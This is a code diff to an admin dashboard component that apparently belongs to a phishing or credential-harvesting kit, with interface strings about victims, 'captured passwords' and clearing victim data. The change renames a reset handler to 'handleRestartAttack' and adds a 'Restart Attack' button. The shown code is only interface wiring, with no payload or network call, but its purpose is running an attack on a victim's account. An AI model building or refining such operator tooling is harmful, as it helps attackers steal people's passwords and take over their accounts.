@@ -16,7 +16,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type, Lock, Unlock, Loader2 } from "lucide-react";
+import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type, Lock, Unlock, Loader2, RefreshCw } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -285,7 +285,7 @@ export function AdminDashboard() {
     }
   };
 
-  const handleResetVictimState = async () => {
+  const handleRestartAttack = async () => {
     if (isProcessing) return;
     if (window.confirm("This will restart the attack flow for the victim but will NOT clear any captured passwords. Continue?")) {
       setIsProcessing('reset');
@@ -410,9 +410,6 @@ export function AdminDashboard() {
                         </DropdownMenuItem>
                       </DropdownMenuContent>
                     </DropdownMenu>
-                    <Button variant="outline" size="icon" onClick={handleResetVictimState} title="Reset Victim Session" disabled={!!isProcessing}>
-                        {isProcessing === 'reset' ? <Loader2 className="h-4 w-4 animate-spin" /> : <History className="h-4 w-4" />}
-                    </Button>
                     <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data' || !!isProcessing}>
                         {isProcessing === 'clear' ? <Loader2 className="h-4 w-4 animate-spin" /> : <Trash2 className="h-4 w-4" />}
                     </Button>
@@ -451,6 +448,15 @@ export function AdminDashboard() {
                              </div>
                            )}
                         </div>
+                        <Button 
+                            variant="outline" 
+                            className="w-full"
+                            onClick={handleRestartAttack}
+                            disabled={!!isProcessing || !state?.victim.email}
+                            >
+                            {isProcessing === 'reset' ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
+                           Restart Attack
+                        </Button>
                     </div>
                      <Separator />
                       <div className="space-y-4">
